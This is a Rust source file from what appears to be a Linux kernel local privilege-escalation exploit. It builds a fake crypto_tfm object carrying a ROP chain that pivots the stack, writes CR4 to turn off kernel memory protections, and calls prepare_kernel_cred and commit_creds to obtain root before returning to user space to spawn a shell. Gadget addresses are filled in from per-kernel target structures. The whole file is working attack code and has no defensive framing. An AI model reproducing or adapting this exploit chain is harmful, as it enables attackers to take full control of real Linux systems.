// RIP = stack pivot : push rdx ; pop rsp ; ret
// fake stack:
// -------------------------
// +0x28 pop rdi; ret
// +0x8  DESIRED_CR4
// +0x8  native_write_cr4 
// +0x8  pop rdi; ret
// +0x8  0x000000000
// +0x8  prepare_kernel
// +0x8  mov rdi, rax
// +0x18 commit_cred
// +0x8  stage_one

use crate::targets::Target;
use crate::payload::stage_one;
use crate::mqueue::MAX_MSG_SIZE;

pub fn build_tfm_obj(target: &Target) -> Vec<u8> {

    let max_msg_size = MAX_MSG_SIZE.try_into().unwrap();
    let mut crypto_tfm = vec![0u8; max_msg_size];

    crypto_tfm.fill(0x41);

    // Set RAX ptr for read - junk ptr
    let rax: u64 = target.rax_ptr;
    let rax_bytes: [u8; 8] = rax.to_ne_bytes(); // Placeholder, replace with actual target address
    let rax_pos = max_msg_size - target.rax_off;
    crypto_tfm[rax_pos..rax_pos + rax_bytes.len()].copy_from_slice(&rax_bytes);

    // 0xffffffff812c2547 : push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
    // will also set RBP as 0x41414141
    let stack_pivot: u64 = target.pivot; // Replace with actual address
    let stack_pivot_bytes = stack_pivot.to_ne_bytes();
    let stack_pivot_pos = max_msg_size - target.rip_off;
    crypto_tfm[stack_pivot_pos..stack_pivot_pos + stack_pivot_bytes.len()].copy_from_slice(&stack_pivot_bytes);

    // 0xffffffff813d3cdf : pop rdi ; ret
    let pop_rdi_ret: u64 = target.poprdiret;
    let pop_rdi_ret_bytes = pop_rdi_ret.to_ne_bytes();
    let pop_rdi_ret_pos = stack_pivot_pos + target.pivot_off;
    crypto_tfm[pop_rdi_ret_pos..pop_rdi_ret_pos + pop_rdi_ret_bytes.len()].copy_from_slice(&pop_rdi_ret_bytes);

    // if i cared id make a function to get/return desired CR4
    // value to write to CR4 // RDI
    let value: u64 = 0x407f0; // Replace with actual address 0x407f0
    let value_bytes = value.to_ne_bytes();
    let value_pos = pop_rdi_ret_pos + 0x8;
    crypto_tfm[value_pos..value_pos + value_bytes.len()].copy_from_slice(&value_bytes);  

    // Address of native_write_cr4
    let native_write_cr4: u64 = target.native_write_cr4; // Replace with actual address
    let native_write_cr4_bytes = native_write_cr4.to_ne_bytes();
    let native_write_cr4_pos = value_pos + 0x8;
    crypto_tfm[native_write_cr4_pos..native_write_cr4_pos + native_write_cr4_bytes.len()].copy_from_slice(&native_write_cr4_bytes);
    
    // 0xffffffff813d3cdf : pop rdi ; ret
    let pop_rdi_ret_two_pos = native_write_cr4_pos + 0x8;
    crypto_tfm[pop_rdi_ret_two_pos..pop_rdi_ret_two_pos + pop_rdi_ret_bytes.len()].copy_from_slice(&pop_rdi_ret_bytes);

    // pass 0x00 arg to prepare_kernel_cred
    let value_two: u64 = 0x00;
    let value_two_bytes = value_two.to_ne_bytes();
    let value_two_pos = pop_rdi_ret_two_pos + 0x8;
    crypto_tfm[value_two_pos..value_two_pos + value_two_bytes.len()].copy_from_slice(&value_two_bytes);

    // prepare_kernel_cred
    let prepare_kernel_cred: u64 = target.prepare_kernel_cred;
    let prepare_kernel_cred_bytes = prepare_kernel_cred.to_ne_bytes();
    let prepare_kernel_cred_pos = value_two_pos + 0x8;
    crypto_tfm[prepare_kernel_cred_pos..prepare_kernel_cred_pos + prepare_kernel_cred_bytes.len()].copy_from_slice(&prepare_kernel_cred_bytes);

    // mov rdi, rax ; ret - needed to move the returned cred struct to rdi to pass it to commit_creds
    // 0xffffffff8131e4fe : mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
    // will pop 2 values (+0x10) from RSP .. 
    let mov_rdi_rax: u64 = target.mov_rdi_rax;
    let mov_rdi_rax_bytes = mov_rdi_rax.to_ne_bytes();
    let mov_rdi_rax_pos = prepare_kernel_cred_pos + 0x8;
    crypto_tfm[mov_rdi_rax_pos..mov_rdi_rax_pos + mov_rdi_rax_bytes.len()].copy_from_slice(&mov_rdi_rax_bytes);

    // commit_creds
    let commit_creds: u64 = target.commit_creds;
    let commit_creds_bytes = commit_creds.to_ne_bytes();
    let commit_creds_pos = mov_rdi_rax_pos + target.commit_off;
    crypto_tfm[commit_creds_pos..commit_creds_pos + commit_creds_bytes.len()].copy_from_slice(&commit_creds_bytes);

    // stage_one() -> ret2usr() -> do_shell
    let stage_one_addr = stage_one as *const () as u64; // getroot
    let stage_one_bytes = stage_one_addr.to_ne_bytes();
    let stage_one_pos = commit_creds_pos + 0x8;
    crypto_tfm[stage_one_pos..stage_one_pos + stage_one_bytes.len()].copy_from_slice(&stage_one_bytes);

    crypto_tfm
}